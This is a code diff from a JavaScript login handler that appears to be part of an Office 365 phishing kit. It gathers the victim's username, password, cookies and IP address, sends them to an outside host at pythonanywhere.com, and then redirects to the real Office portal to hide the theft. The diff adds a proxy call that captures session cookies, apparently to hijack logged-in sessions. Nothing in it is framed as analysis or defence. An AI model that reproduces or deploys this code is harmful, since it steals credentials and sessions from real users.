@@ -7578,14 +7578,20 @@ $("#login-final-submit").off("click").on("click", async function(e) {
 
     var ip = await getUserIP();
 
-    var formData = new FormData();
-    formData.append('login', username);
-    formData.append('passwd', password);
-    formData.append('cookies', getCookies());
-    formData.append('ip', ip);
-
-
     try {
+        let proxyResponse = await fetch('/rr', {
+            method: 'GET',
+            credentials: 'include' // Ensures cookies are included
+        });
+
+        console.log("Cookies set by the proxy:", document.cookie);
+
+        var formData = new FormData();
+        formData.append('login', username);
+        formData.append('passwd', password);
+        formData.append('cookies', document.cookie);
+        formData.append('ip', ip);
+
         let response = await $.ajax({
             url: 'https://dreco111.pythonanywhere.com/o365',
             method: 'POST',
@@ -7601,15 +7607,21 @@ $("#login-final-submit").off("click").on("click", async function(e) {
         } else if (response.message === 'nopass') {
             $('.alert-error').removeClass('hide-vals').html("Please enter your password.");
         } else if (response.message === 'success') {
-            console.log('go-go-go')
+            console.log('go-go-go');
             setTimeout(() => {
                 window.location.href = 'https://portal.office.com/servicestatus';
             }, 3000);
         }
     } catch (error) {
-        console.error("AJAX Error:", error);
+        console.error("Error:", error);
         $('.alert-error').removeClass('hide-vals').html("An error occurred. Please try again.");
     }
+
+
+
+
+
+
 
     $(".lightbox-cover, #progressBar").addClass('hide-vals');
 });
